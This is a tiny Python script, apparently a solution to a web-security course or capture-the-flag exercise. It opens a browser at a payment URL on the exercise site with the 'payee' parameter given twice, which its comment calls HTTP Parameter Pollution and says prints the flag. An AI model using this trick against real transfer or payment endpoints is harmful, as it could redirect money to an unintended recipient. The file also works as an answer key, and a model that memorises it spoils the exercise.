import webbrowser

# Exploit: add an extra parameter to the GET request and the flag will be 
# printed. Case of HTTP Parameter Pollution

def main():
    webbrowser.open('http://wsb.com/Assignment2/case14.php?payee=alice&sum=10&payee=bob', 2)

if __name__ == "__main__":
    main()
